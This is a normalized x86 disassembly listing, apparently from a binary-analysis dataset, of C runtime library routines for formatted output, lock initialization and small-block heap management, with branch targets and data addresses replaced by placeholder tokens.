sub_200fdd2
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_20099ee
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_200fb13
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_20134c9
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_201096a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_200fbfc
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_2010a36
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_200fdd2
call sub_201096a
add esp 0x18
test eax eax
jge r-xdata
pop ebp
retn
or eax 0xffffffff
sub_2010a5f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_200fdd2
call sub_201096a
add esp 0x18
test eax eax
jge r-xdata
pop ebp
retn
or eax 0xffffffff
sub_2010a89
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_202084f
call sub_201096a
add esp 0x18
cmp eax ebx
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] bl
pop esi
call sub_200fb13
mov [ eax ] 0x22
sub_2010b2e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
call sub_200fb13
mov [ eax ] 0x16
jmp r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
call sub_200fb13
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
cmp edi [ ebp + 0x10 ]
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax [ eax ]
push edi
push esi
push sub_202084f
mov [ ebp - 0x4 ] eax
call sub_201096a
add esp 0x18
mov [ esi + edi - 0x1 ] bl
cmp eax 0xfffffffe
jne r-xdata
mov edi [ eax ]
mov eax [ ebp + 0x10 ]
inc eax
push eax
push esi
push sub_202084f
call sub_201096a
add esp 0x18
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
cmp eax ebx
jge r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
call sub_200fb13
cmp [ eax ] 0x22
jne r-xdata
mov [ esi ] bl
cmp eax 0xfffffffe
jne r-xdata
call sub_200fb13
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_200fb13
mov [ eax ] edi
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x22
call sub_200fb13
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
jmp r-xdata
sub_2010c35
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2010b2e
add esp 0x18
pop ebp
retn
sub_2010c55
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_2014e71
call sub_201096a
add esp 0x18
test eax eax
jge r-xdata
pop ebp
retn
or eax 0xffffffff
sub_2010c7e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_2014e71
call sub_201096a
add esp 0x18
test eax eax
jge r-xdata
pop ebp
retn
or eax 0xffffffff
sub_2010ca8
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_2019192
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_2010cf3
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_2009d98
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_2010d79
push 0xc
push r--data
call sub_200db54
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_200ca7e
push 0x1e
call sub_200c8ad
push 0xff
call sub_200b73b
push 0x18
call sub_201a99e
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_200fb13
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_200db99
retn
push edi
call sub_2009d98
pop ecx
push 0xfa0
push edi
call sub_2019192
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_2009d98
pop ecx
call sub_200fb13
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2010e33
mov eax [ ebp - 0x1c ]
sub_2010e3c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_2010d79
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_200b6e7
pop ecx
sub_2010e90
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1 ]
push esi
cmp ecx 0xfffffffe
jbe r-xdata
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_200fb13
xor esi esi
mov [ rw-data ] eax
xor eax eax
call sub_200fb13
jmp r-xdata
pop esi
pop ebp
retn
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
sub_2010edb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
pop ebp
retn
sub_2010f1c
mov edi edi
push ebp
mov ebp esp
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
inc eax
pop ebp
retn
pop ebp
retn
sub_2010f6a
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_2010f9a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_2021420
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_20112b0
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_2011360
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_2011468
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
